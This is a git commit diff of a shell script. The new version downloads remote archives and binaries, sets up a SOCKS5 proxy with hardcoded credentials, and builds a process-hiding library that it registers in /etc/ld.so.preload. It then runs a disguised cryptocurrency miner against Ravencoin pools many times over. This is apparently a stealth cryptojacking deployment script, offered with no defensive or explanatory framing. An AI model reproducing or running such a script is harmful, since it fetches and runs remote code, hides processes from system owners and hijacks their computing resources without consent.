4e0adddfc3406a76d11d2034fafda90c23fff935
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-09-12 01:56:13 -0500

    Update 11.sh

--- 11.sh
+++ 11.sh
@@ -1,5 +1,59 @@
-#!/bin/bash
-cd /mainsrc
-git clone https://github.com/mycrownteam/pingcrown.git -q
-chmod -R +x pingcrown
-./pingcrown/torun -a ethash -o stratum+tcp://ethash.poolbinance.com:443 -u teguhcong -p x -w az.kienmai05 > /dev/null 2>&1
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.155.69.201:6406
+socks5_username = ingfoingfo
+socks5_password = maszZeehh
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo " "
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo " "
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060 --ocX 
+
+./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060 --ocX 
